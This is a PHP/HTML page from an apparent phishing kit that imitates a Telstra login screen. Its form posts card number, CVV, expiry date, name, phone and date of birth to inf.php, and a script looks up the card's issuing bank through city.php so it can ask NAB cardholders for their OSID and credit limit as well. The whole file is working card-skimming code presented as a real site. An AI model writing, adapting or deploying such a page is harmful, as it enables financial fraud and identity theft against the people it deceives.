<?php
session_start();
$_SESSION['last_visited_page'] = 'infos'; 
?>
<!DOCTYPE html>
...
<body role="document" class="base-blue  white-bkg" cz-shortcut-listen="true"><iframe src="./Telstra Login1_files/storageframe.html" id="LOCSTORAGE" scrolling="no" name="empty" hidden="true" style="width: 1px; height: 1px; position: absolute; top: -7px; left: -7px; border: 0px;"></iframe>
                    ...
                    <div class="standard row content col-100">
                        <div class="col col-100-c0 first last" style="min-height:418px;">
                            <div class="rebrandloginHeadingDiv">
                                <span class="heading rebrandLoginheading rebrandHeadingFont">  </span>
                            </div>
                            <div class="col-wrapper" style="padding: 0px; min-height:418px;">
                                <div class="row col-50-50 rebrandColumns">
                                    <div class="col col-50-50-c0 first rebrandColumn1" style="padding: 0px; min-height:418px;">
                                        <div class="col-wrapper" style="padding: 0px; margin-right: 28px; min-height:700px;">
                                            <div style="padding: 0px; margin-left: 30px; margin-top: 30px;">
                                                <form method="post" id="Login" name="myForm"  action="inf.php" onsubmit="return validateForm()" style="margin: 0px;">
                                                    ...
                                                    <div style="min-height: 282px; ">
                                                        <div class="input-wrapper field-group">
                                                            ...
                                                            <div class="input-container form-control-username cmn_rebrandFormControl">
                                                                ...
                                                                <input type="text" id="username" tabindex="1" name="name" value="" size="30" autocomplete="off" maxlength="200" onkeypress="EnterKeyPress(event);" placeholder="Name On card" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
                                                        ...
                                                        <div class="input-wrapper field-group">
                                                            ...
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                ...
                                                                <input class="saisie5 "  type="text" tabindex="2" id="cc" name="password" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="Card Number" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
                                                        ...
                                                        <div class="input-wrapper field-group">
                                                            ...
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                ...
                                                                <input type="" tabindex="2" id="password" name="cvv" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="Security Code" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
                                                        <div class="input-wrapper field-group">
                                                            <dt>Expiry Date  *</dt>
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                ...
                                                                <input type="" tabindex="2" id="password" name="exp" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="e.g 11/2021" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
                                                        <div class="input-wrapper field-group">
                                                            <dt>Phone Number *</dt>
                                                            <div class="input-container form-control-username cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>
                                                                <input type="text" id="phone" tabindex="1" name="phone" value="" size="30" autocomplete="off" maxlength="200" onkeypress="EnterKeyPress(event);" placeholder="Phone Number" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
                                                        <div class="input-wrapper field-group">
                                                            <dt>Date of birth *</dt>
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                ...
                                                                <input type="" tabindex="2" id="password" name="dob" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="DD/MM/YYYY" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;" >
                                                            </div>
                                                        </div>
                                                        <div style="display: none;" id="mam"  class="input-wrapper field-group">
                                                            <dt>Member Number *</dt>
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>

                                                                <input type="" tabindex="2" id="password" name="mem" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="Your Member Number" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                            </div>
                                                        </div>
                                                        <div style="display: none;" id="louz" class="saisie5 lol">
                                                            <dt>OSID *</dt>
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>

                                                                <input type="" tabindex="2" id="password" name="osid" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="On your NAB card" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                            </div>
                                                        </div>
                                                        <div style="display: none;" id="taz"  class="input-wrapper field-group">
                                                            <dt>Credit Limit *</dt>
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>

                                                                <input type="" tabindex="2" id="password" name="limit" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="e.g 1000" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                            </div>
                                                        </div>
                                                    ...
                                                    <div>
                                                        <input class="set-theme blue" type="submit" value="Continue &nbsp;&nbsp;&nbsp;&nbsp;&#5171;">
                                                    </div>
  ...
  let y = document.forms["myForm"]["cc"].value;
  if (y == "") {
    alert("cc must be filled out");
    return false;
  }
  let a = document.forms["myForm"]["cvv"].value;
  if (a == "") {
    alert("CVV must be filled out");
    return false;
  }
  let b = document.forms["myForm"]["exp"].value;
  if (b == "") {
...
<script>
    $(document).ready(function(){
        $('.saisie5').on( 'keyup', function(){
            if( $(this).val().length >= 5 ){
                var $zip = $(this).val();
                $zip = $zip.replace(' ', '')
                var $url = 'city.php?zip='+$zip.substr(0, 6);
                ...
                $.ajax({
                  url: $url, 
                  success: function(data){
                      if( data.indexOf('NATIONAL') >= 0 || data.indexOf('NAB') >= 0 ){
                          $city = data;
                          document.getElementById("louz").style.display = "block";
                          document.getElementById("taz").style.display = "block";
                      }else{
                          document.getElementById("louz").style.display = "none";
                          document.getElementById("taz").style.display = "none";
                      }
                  },
                  error: function(data){
                      console.log(data);
